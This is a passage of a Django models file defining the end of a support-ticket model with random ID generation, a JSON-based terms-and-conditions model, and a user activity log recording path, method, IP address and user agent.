        max_length=100, 
        default='Pending', 
        choices=status_choices,
    )

    created_at = models.DateTimeField(
        auto_now_add=True, 
        null=True, 
        blank=True
    )

    def __str__(self):
        return f'Ticket ID: {self.ticket_id} - {self.user.get_full_name() if self.user else "Unregistered User"}'
    
    def save(self, *args, **kwargs):
        if not self.ticket_id:
            for _ in range(20):
                ticket_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=20))
                if not Tickets.objects.filter(ticket_id=ticket_id).exists():
                    self.ticket_id = ticket_id
                    break
        super().save(*args, **kwargs)


class TermsAndConditions(models.Model):
    content = models.JSONField(
        default=dict, 
        help_text='This field stores the terms and conditions in a JSON format (inside a curly brace ). The content should be structured as a key-value pair, each containing a title and content. Example: {"title1": "paragraph1", "title2": "content2"} etc. separate each title and content with a comma.'
    )

    def __str__(self):
        return 'Terms and Conditions' 


class ActivityLog(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    path = models.CharField(max_length=500)
    method = models.CharField(max_length=10)
    ip_address = models.GenericIPAddressField(null=True, blank=True)
    user_agent = models.TextField(null=True, blank=True)
    timestamp = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.user.get_full_name()} visited {self.path} at {self.timestamp.strftime('%d-%m-%Y, %H:%M:%S')}"